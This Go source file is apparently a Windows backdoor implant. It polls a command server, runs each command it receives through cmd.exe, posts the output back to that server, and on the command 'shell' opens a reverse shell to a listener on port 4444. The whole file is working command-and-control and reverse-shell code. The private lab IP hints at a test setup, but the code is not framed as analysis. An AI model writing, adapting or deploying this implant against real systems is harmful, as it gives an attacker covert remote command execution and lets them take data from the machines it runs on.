package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net"
    "net/http"
    "os/exec"
    "sync"
    "time"
)

// Command received from the server
type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

// CommandResult to be sent back to the server
type CommandResult struct {
    ID     string `json:"id"`
    Result string `json:"result"`
}

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000" // Your server URL
    listenerAddress  = "192.168.56.101:4444"        // Listener address for the reverse shell
)

func fetchCommand() (Command, error) {
    var cmd Command
    resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }
    err = json.Unmarshal(body, &cmd)
    return cmd, err
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        fmt.Printf("Error marshalling result: %v\n", err)
        return
    }

    _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("Failed to send result: %v\n", err)
    }
}

func openReverseShell() {
    conn, err := net.Dial("tcp", listenerAddress)
    if err != nil {
        fmt.Printf("Failed to open reverse shell to %s: %v\n", listenerAddress, err)
        return
    }
    defer conn.Close()

    cmd := exec.Command("cmd.exe")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
    if err := cmd.Run(); err != nil {
        fmt.Printf("Failed to run shell command: %v\n", err)
    }
}

func executeCommand(cmd Command) {
    if cmd.Cmd == "shell" {
        // Open a reverse shell connection
        openReverseShell()
    } else {
        // Execute other commands and capture output
        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
        resultText := string(output)
        if err != nil {
            resultText += fmt.Sprintf("\nError: %v", err)
        }

        // Send command execution result back to the server
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: resultText,
        })
    }
}

func main() {
    fmt.Println("Application started. Waiting for commands...")
    ticker := time.NewTicker(10 * time.Second)

    go func() {
        for range ticker.C {
            mu.Lock()
            if !isCommandRunning {
                isCommandRunning = true
                mu.Unlock()

                cmd, err := fetchCommand()
                if err != nil {
                    fmt.Printf("Error fetching command: %s\n", err)
                    continue
                }
                if cmd.ID != "" {
                    executeCommand(cmd)
                }

                mu.Lock()
                isCommandRunning = false
            }
            mu.Unlock()
        }
    }()

    select {} // Prevent the application from exiting immediately
}
